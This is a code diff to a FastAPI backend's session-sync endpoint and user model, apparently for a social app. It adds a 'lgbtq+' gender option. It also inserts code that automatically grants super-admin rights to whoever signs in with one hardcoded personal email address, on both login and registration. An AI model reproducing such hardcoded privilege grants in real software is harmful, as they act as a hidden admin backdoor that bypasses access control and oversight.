@@ -25,7 +25,7 @@ class SessionSyncRequest(BaseModel):
     whatsapp_number: str = Field(..., pattern=r"^\+91[6-9]\d{9}$", description="WhatsApp phone number")
     full_name: str = Field(..., min_length=2, max_length=50, pattern=r"^[a-zA-Z\s]+$")
     dob: date = Field(..., description="Date of birth YYYY-MM-DD")
-    gender: str = Field(..., pattern=r"^(male|female|other)$", description="male, female, or other")
+    gender: str = Field(..., pattern=r"^(male|female|lgbtq\+|other)$", description="male, female, lgbtq+, or other")
     city: str = Field(..., min_length=2, max_length=50)
     bio: Optional[str] = Field("", max_length=250)
     android_id: Optional[str] = Field("", max_length=100)
@@ -138,6 +138,12 @@ async def session_sync(
                 detail="Account has been suspended for safety violations."
             )
 
+        caller_email = token_data.get("email")
+        if caller_email == "kshtriyaanubhav9120@gmail.com" and not user.is_super_admin:
+            user.is_super_admin = True
+            await db.commit()
+            await db.refresh(user)
+
         # Check Installation UUID
         if user.last_installation_uuid != x_installation_uuid:
             # CASE A: Reinstall detected -> Execute "Zero on Delete" Wipe
@@ -178,6 +184,8 @@ async def session_sync(
             }
     else:
         # CASE C: New User Registration
+        caller_email = token_data.get("email")
+        is_master = (caller_email == "kshtriyaanubhav9120@gmail.com")
         new_user = User(
             firebase_uid=firebase_uid,
             phone_number=payload.phone_number,
@@ -189,6 +197,7 @@ async def session_sync(
             bio=payload.bio or "",
             streak_count=1,
             reward_balance=0,
+            is_super_admin=is_master,
             last_installation_uuid=x_installation_uuid
         )
         db.add(new_user)
